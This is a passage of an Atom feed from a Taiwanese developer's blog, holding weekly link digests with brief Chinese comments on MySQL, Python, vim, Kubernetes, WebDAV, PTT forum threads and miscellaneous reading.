&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/11/%e4%b8%ad%e5%9c%8b%e9%80%9a%e9%81%8e%e3%80%8c%e7%b6%b2%e8%b7%af%e5%ae%89%e5%85%a8%e6%b3%95%e3%80%8d%e8%8d%89%e6%a1%88-2016/"&gt;中國通過「網路安全法」 - 2016 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;新聞提到的「通過採取這種限制措施，中國冒下了風險，可能在技術上與世界其他國家隔絕」，是打算把對外網路切掉嗎？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;devops&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/11/tail-%e9%81%a0%e7%ab%af%e5%a4%9a%e5%8f%b0%e6%a9%9f%e5%99%a8-log-%e6%aa%94%e7%9a%84%e5%b7%a5%e5%85%b7/"&gt;tail 遠端多台機器 Log 檔的工具 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;tail -F log-file 只能針對本機，monkeytail (mtail) 可以針對遠端，而且可以自己設定 Group，一次搞定。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;第一次聽到 monkeytail 這個工具  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.gcp.expert/gcp-saving-your-cost/"&gt;GCP 錦囊妙計：這五招告訴你如何節省時間與花費&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是都知道的事情。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://jvns.ca/blog/2016/11/10/a-few-drawings-about-linux/"&gt;A few drawings about Linux - Julia Evans&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個作者自己畫了很多跟 Linux 有關的小漫畫。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/9229601/what-is-in-c-code"&gt;linux - What is ":-!!" in C code? - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;What does :-!! do?  This is, in effect, a way to check whether the expression e can be evaluated to be 0, and if not, to fail the build.  &lt;/li&gt;
&lt;li&gt;這寫法真的挺神奇的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;mysql&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2016/11/13/6952/%e9%97%9c%e9%96%89-mysql-%e7%9a%84-query-cache/"&gt;關閉 MySQL 的 Query Cache | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「MySQL 的 Query Cache 是目前已知效能不好的主要因素之一 (global mutex lock 的緣故)」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.percona.com/blog/2015/01/02/the-mysql-query-cache-how-it-works-and-workload-impacts-both-good-and-bad/"&gt;The MySQL Query Cache: How it works and workload impacts&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The MySQL query cache is one of the prominent features in MySQL and a vital part of query optimization. It is important to know how the MySQL query cache works, as it has the potential to cause significant performance improvements – or a slowdown – of your workload.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.percona.com/blog/2016/11/11/is-your-query-cache-really-disabled/"&gt;Is Your Query Cache Really Disabled? - Percona Database Performance Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;This blog post was motivated by an internal discussion about how to fully disable query cache in MySQL.  According to the manual, we should be able to disable “Query Cache” on the fly by changing query_cache_type to 0, but as we will show this is not fully true.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/100744/"&gt;看程序员是如何把自动化做到极致的！ - 文章 - 伯乐在线&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;除了很紅的&lt;a href="https://github.com/narkoz/hacker-scripts"&gt;那篇超過 90 秒就要自動化的&lt;/a&gt;以外還有些其他的  &lt;/li&gt;
&lt;li&gt;原文：&lt;a href="https://www.quora.com/As-a-programmer-what-tasks-have-you-automated-to-make-your-everyday-life-easier"&gt;As a programmer, what tasks have you automated to make your everyday life easier? - Quora&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://pymotw.com/3/warnings/"&gt;warnings — Non-fatal Alerts — PyMOTW 3&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;好像是個不錯用的 module  &lt;/li&gt;
&lt;li&gt;沒想到 warnings 自己也有一個專門的 module 可用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.jeffknupp.com/blog/2016/11/13/how-python-makes-working-with-data-more-difficult-in-the-long-run/"&gt;How Python Makes Working With Data More Difficult in the Long Run&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;嗯 Dynamic typing 是把雙面刃？ 值得思考一下  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://doughellmann.com/blog/2016/10/31/mailbox-manipulate-email-archives-pymotw-3/"&gt;mailbox — Manipulate Email Archives — PyMOTW 3 – Doug Hellmann&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Python 竟然有這個 module 可用，看來真的要有心的話，用 Python 自己寫個 mail server 應該是可行的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pymotw.com/3/imaplib/index.html"&gt;imaplib — IMAP4 Client Library — PyMOTW 3&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;imaplib implements a client for communicating with Internet Message Access Protocol (IMAP) version 4 servers. The IMAP protocol defines a set of commands sent to the server and the responses delivered back to the client.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;sql&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/10/alibaba-mysql-branch-open-source-alisql-2016/"&gt;阿里巴巴(淘寶) Open Source 的 MySQL：AliSQL&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;電子商務行業常常遇到搶購限量商品、搶票... 等等的事件，看來 AliSQL 對這件事有特別處理。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Gossiping/M.1479821040.A.671.html"&gt;Re: [問卦] 蔣光頭沒來台灣、台灣能有今天嗎 - 看板 Gossiping - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;很多以前在歷史課本裡頭學到的近代台灣史完全不是課本裡頭說的這麼一回事呢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;vim&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/11/vim-open-file-line-number-search-2016/"&gt;Vim 開檔自動到第幾行、搜尋位置的方法 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;範例  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;vim +30 filename # 直接到第30行&lt;/code&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;vim +/function-name filename # 直接到搜尋文字(functionname)的位置&lt;/code&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;原來有這種用法，受教了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ligershark/webdevchecklist.com"&gt;ligershark/webdevchecklist.com: Web Developer Checklist&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;給網站開發人員的檢查清單，感覺挺實用的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/11/fire-fighter-how-to-live-2016/"&gt;林金宏 講解 火災發生的「火場求生」注意事項 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個火場求生的演講真的好棒啊，平常真的有好多的錯誤觀念。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;批踢踢&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/movie/M.1480086802.A.81E.html"&gt;[討論] 《怪獸與牠們的產地》三刷筆記感想（雷） - 看板 movie - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「梅林的鬍子」用台式的說法個人覺得應該是「夭壽喔」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/WomenTalk/M.1479623370.A.40D.html"&gt;[閒聊] 8年級在職場的還好嗎 - 看板 WomenTalk - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;真的是看批踢踢找自尊  &lt;/li&gt;
&lt;li&gt;還是跟身邊的人比才會進步吧  &lt;/li&gt;
&lt;li&gt;是說比年薪比較準吧  &lt;/li&gt;
&lt;li&gt;竹科一堆底薪不高但分紅跟年終多的跟啥一樣  &lt;/li&gt;
&lt;li&gt;但這個有點酷  &lt;/li&gt;
&lt;li&gt;「81 / 60-70k / 營建業師傅 / 水泥工」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/StupidClown/M.1479772628.A.5E8.html"&gt;Re: [無言] 計程車上最狂的下午茶 - 看板 StupidClown - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;結果是業配文，這年頭的業配真的得花好多心思呀。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://chuansong.me/n/2365017"&gt;揭秘美国的自动化午餐公司-FORKABLE_NEXTMIND_传送门&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用 Machine Learning 來幫你決定午餐要吃什麼  &lt;/li&gt;
&lt;li&gt;好像挺不錯的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www1.cgmh.org.tw/intr/intr5/c6210/thyroid%20cancer.html"&gt;甲狀腺癌 - 嘉義長庚一般外科&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;依據2013年衛生署國民健康局公布的2010年癌症登記資料顯示，甲狀腺癌佔2010年全部惡性腫瘤死亡人數的0.33%  &lt;/li&gt;
&lt;li&gt;跟在唸醫學系的高中同學吃飯才得知原來甲狀腺癌的痊癒率極高，而且罹癌十年後的死亡機率極低。  &lt;/li&gt;
&lt;li&gt;同學表示如果非得要選一個癌症得的話就是甲狀腺癌了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://zh.wikipedia.org/wiki/%E6%80%A7%E9%9D%A9%E5%91%BD"&gt;性革命 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;性革命是指歐美國家在性观念的革命性變化，發生於1960年代至1980年代間[1]，主要指人際關係及性行為對於傳統價值的衝擊，美國民主黨即常以相關訴求爭取選票。  &lt;/li&gt;
&lt;li&gt;台灣這邊比較常見的說法是「性解放」，但很多人還是沒有真正瞭解其意思，尤其是媒體會常常將其與濫交連結在一起，讓社會大眾認為性解放是不好的。  &lt;/li&gt;
&lt;li&gt;但其實性解放一開始起源是女權組織爭取墮胎權、避孕權以及性自主權，1990 年代以後，開始有非異性戀的 LGBT 爭取不被異性戀歧視的人權甚至是非異性戀的相愛者可以結婚的婚姻平權。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://note.hy31.net/?p=154&amp;amp;utm_content=bufferbf7aa&amp;amp;utm_medium=social&amp;amp;utm_source=twitter.com&amp;amp;utm_campaign=buffer#more-154"&gt;信用卡相關知識筆記 | Henry的筆記集散地&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;其中，我們可以透過信用卡的前 6 位數來辨識卡片的發卡組織、卡種、發卡銀行等相關資料，因為這前 6 位數其實是國際上用來區分發卡的數字所以拿到同一款卡片的人前六碼一定一樣。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="blog"></category><category term="china"></category><category term="devops"></category><category term="gcp"></category><category term="life"></category><category term="linux"></category><category term="misc"></category><category term="mysql"></category><category term="programmer"></category><category term="python"></category><category term="sql"></category><category term="taiwan"></category><category term="trivia"></category><category term="vim"></category><category term="web"></category><category term="批踢踢"></category></entry><entry><title>Y2016W46</title><link href="https://blog.m157q.tw/posts/2016/11/21/y2016w46/" rel="alternate"></link><published>2017-01-25T21:29:06+08:00</published><updated>2017-01-25T21:29:06+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-11-21:posts/2016/11/21/y2016w46/</id><summary type="html">&lt;h3&gt;cli&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.tecmint.com/20-funny-commands-of-linux-or-linux-is-fun-in-terminal/"&gt;20 Funny Commands of Linux or Linux is Fun in Terminal&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一些有趣的指令，無聊可以裝來玩玩。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;csnews&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;應該是這週最大的兩個新聞吧，微軟成為 Linux 基金會白金級會員，Google 加入微軟的 .NET 基金會，2016 年實在是太多變化了。  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.linuxfoundation.org/announcements/microsoft-fortifies-commitment-to-open-source-becomes-linux-foundation-platinum"&gt;Microsoft Fortifies Commitment to Open Source, Becomes Linux Foundation Platinum Member&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://techcrunch.com/2016/11/16/google-signs-on-to-the-net-foundation-and-samsung-brings-net-support-to-tizen/"&gt;Google signs on to the .NET Foundation as Samsung brings .NET support to Tizen&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;data recovery&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.freebuf.com/sectool/119574.html"&gt;漲姿勢：手把手教你恢復Linux中的誤刪文件 - FreeBuf.COM | 關注黑客與極客&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;紀錄一下，最好是以後不需要用到，之前救過一次是用 &lt;code&gt;foremost&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/junyiacademy/dauGA"&gt;junyiacademy/dauGA: dump raw log data from google analytics&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;把 Google Analytics 的資料灌入 BigQuery 的 script，用 Python 寫的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/symless/synergy"&gt;symless/synergy: Share one mouse and keyboard between multiple computers on your desk. http://symless.com&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一套 Open Source 且跨作業系統，可以讓你用一組鍵盤滑鼠同時操作多個電腦的軟體。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;k8s&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/GoogleCloudPlatform/kubernetes-workshops/tree/master/bundles/kubernetes-101"&gt;kubernetes-workshops/bundles/kubernetes-101 at master · GoogleCloudPlatform&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;k8s 的簡單教學範例  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://man7.org/linux/man-pages/man5/attr.5.html"&gt;xattr(7) - Linux manual page&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;machine learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.techug.com/machine-learning-top10-algorithms"&gt;十大機器學習算法 | 程序師&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.cs.uvm.edu/~icdm/algorithms/CandidateList.shtml"&gt;www.cs.uvm.edu/~icdm/algorithms/CandidateList.shtml&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://codeanywhere.com"&gt;Codeanywhere&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;又是一個  Cloud IDE，感覺好像挺不錯的，但沒用過。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3.5/library/abc.html"&gt;29.7. abc — Abstract Base Classes — Python 3.5.2 documentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://dbader.org/blog/abstract-base-classes-in-python"&gt;Abstract Base Classes in Python – dbader.org&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;再次復習一下 ABC 的用法  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.python.org/3/library/multiprocessing.html"&gt;17.2. multiprocessing — Process-based parallelism — Python 3.5.2 documentat&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;每次都會忘記 python 的 multiprocessing 怎麼寫，乾脆一次收集起來。  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/20887555/dead-simple-example-of-using-multiprocessing-queue-pool-and-locking"&gt;python - Dead simple example of using Multiprocessing Queue, Pool and Locki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://timothyawiseman.wordpress.com/2012/12/21/a-really-simple-multiprocessing-python-example/"&gt;A really simple Multiprocessing Python Example | TimothyAWiseman – SQLWise&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.quantstart.com/articles/parallelising-python-with-threading-and-multiprocessing"&gt;Parallelising Python with Threading and Multiprocessing - QuantStart&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://pymotw.com/2/multiprocessing/basics.html"&gt;multiprocessing Basics - Python Module of the Week&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.davekuhlman.org/python_multiprocessing_01.html"&gt;Multiprocessing in Python: a guided tour with examples&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.giantflyingsaucer.com/blog/?p=4450"&gt;Getting started with Multiprocessing in Python | Giant Flying Saucer&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/3044580/multiprocessing-vs-threading-python"&gt;multithreading - Multiprocessing vs Threading Python - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/instamojo-matters/become-a-pdb-power-user-e3fc4e2774b2"&gt;Become a pdb power-user – Instamojo Matters – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇 pdb 的教學文章真的滿不錯的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/10/httpstat-log-dns-lookup-to-download-time-2016/"&gt;httpstat 分析 從 DNS查詢 到 下載完成 各個階段的處理時間&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這 CLI 工具挺棒的，可以幫你清楚的標出 HTTP request 在 DNS Lookup, TCP Connection, Server Processing, Content Transfer 花的時間。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/google/budou"&gt;google/budou: Automatic Japanese line breaking tool&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://opensource.googleblog.com/2016/10/budou-automatic-japanese-line-breaking.html"&gt;Budou: Automatic Japanese line breaking tool&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://doc.pytest.org/en/latest/example/pythoncollection.html"&gt;Changing standard (Python) test discovery — pytest documentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;因為公司的 project 有用到 pytest，然後需要改預設的 test discovery  &lt;/li&gt;
&lt;li&gt;但後來還是試不出來，所以直接從 coverage 的部份下手。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;sql&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/10/alibaba-mysql-branch-open-source-alisql-2016/"&gt;阿里巴巴(淘寶) Open Source 的 MySQL：AliSQL&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;阿里巴巴 fork 出來改的 MySQL，針對秒殺時間有特別處理的 MySQL。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;webdav&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;因為豐原計劃而看了些 webdav 的東西  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://tools.ietf.org/html/rfc4918"&gt;RFC 4918 - HTTP Extensions for Web Distributed Authoring and Versioning (We&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tolsen/litmus"&gt;tolsen/litmus: WebDAV test suite&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/fruux/sabre-dav"&gt;fruux/sabre-dav: sabre/dav is a CalDAV, CardDAV and WebDAV framework for PH&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.plurk.com/m/p/ly0vkj"&gt;江戶川莫紅★緋色柯推廣協會 #台灣小常識台灣有個兔兒神廟，在中和。兔兒神胡天保大爺：清朝人，因戀慕同性巡撫而被處死。「今天陰官封我為兔兒神，專門管理人&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;完全不知道竟然有專門管同性戀情的兔兒神  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=fZXyRsbkLz0&amp;amp;list=PLwItru4bLdHyn4asw3Bu0hNfgyP6H-XUN&amp;amp;index=7"&gt;『想找茶？來天龍國找我吧！』- 臺灣世界史 第7集&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;shopping&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.flightlineshop.com/%E5%95%86%E5%93%81/%e3%80%90flightline%e3%80%91%e8%8b%b1%e5%9c%8b-code-10-%e5%b8%a5%e6%b0%a3%e5%9e%8b%e6%a0%bc%e9%98%b2%e7%9b%9c%e9%98%b2%e6%b0%b4%e5%a4%9a%e5%8a%9f%e8%83%bd%e5%8d%b7%e8%93%8b%e5%bc%8f%e8%83%8c-2/"&gt;英國 CODE 10 帥氣型格防盜防水多功能卷蓋式背包 | Flightline Shop - Fashion Never Ends&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看起來挺棒的，但價格好貴啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://searchingc.com/baubax/"&gt;美國 BAUBAX 全球最強 旅行外套 15種功能 【獨家預購】 | SearchingC&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這件好像很不錯耶，出國感覺超方便的，可是價錢有點貴。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="cli"></category><category term="csnews"></category><category term="data recovery"></category><category term="gcp"></category><category term="github"></category><category term="javascript"></category><category term="k8s"></category><category term="linux"></category><category term="machine learning"></category><category term="programming"></category><category term="python"></category><category term="shopping"></category><category term="sql"></category><category term="taiwan"></category><category term="webdav"></category></entry><entry><title>Y2016W45</title><link href="https://blog.m157q.tw/posts/2016/11/14/y2016w45/" rel="alternate"></link><published>2016-11-26T09:38:32+08:00</published><updated>2016-11-26T09:38:32+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-11-14:posts/2016/11/14/y2016w45/</id><summary type="html">&lt;h3&gt;interview&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Soft_Job/M.1478073114.A.177.html"&gt;[心得]研替(QNAP/群暉/HTC/Garmin/宇匯/appier) - 看板 Soft_Job - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;啊 每次看別人的面試心得都覺得自己好廢啊 QQ  &lt;/li&gt;
&lt;li&gt;然後 Appier 真的找了好多厲害的人進去呀  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;javascript&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.wu-boy.com/2016/10/replcae-npm-with-yarn-package-management/"&gt;用 Yarn 取代 Npm 管理 JavaScript 套件版本&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;安裝速度真的比 npm 快好多啊  &lt;/li&gt;
&lt;li&gt;實際試用的效果的確如此，而且可以直接無痛從 &lt;code&gt;npm&lt;/code&gt; 改換 &lt;code&gt;yarn&lt;/code&gt;，一樣是使用 &lt;code&gt;package.json&lt;/code&gt;，覺得不錯。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;math&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://speakerdeck.com/ccckmit/yong-shi-fen-zhong-kuai-su-zhang-wo-shu-xue-de-zheng-ti-jie-gou"&gt;用十分鐘快速掌握《數學的整體結構》 // Speaker Deck&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個十分鐘系列也很棒啊，雖然我還是因為對數學的掌握度不夠高，所以無法完全看懂，該多讀點書了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;opensource&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://breezymove.blogspot.com/2016/10/blog-post.html"&gt;邁向永續的臺灣桌面應用自由軟體在地發展&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;開源軟體的中文化逐漸式微 QQ  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://vinta.ws/code/where-to-find-great-content-to-read.html"&gt;你都去哪裡看技術文章？ | I failed the Turing Test&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;雖然已經是一年前的文章了，但還是很值得參考，尤其是對於 Python, Web-backend developer 來說。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://verraes.net/2013/10/pre-merge-code-reviews/"&gt;Pre-merge Code Reviews&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;三年前的文章，但還是很值得閱讀。  &lt;/li&gt;
&lt;li&gt;主要在講述作者自己平常在團隊開發時，把某個 branch merge 到 master branch 之前的 code review 遵循的一些規則。  &lt;/li&gt;
&lt;li&gt;篇幅不長，條列式列出重點及其原因。  &lt;/li&gt;
&lt;li&gt;節錄一下最重要的規則部份：  &lt;/li&gt;
&lt;/ul&gt;
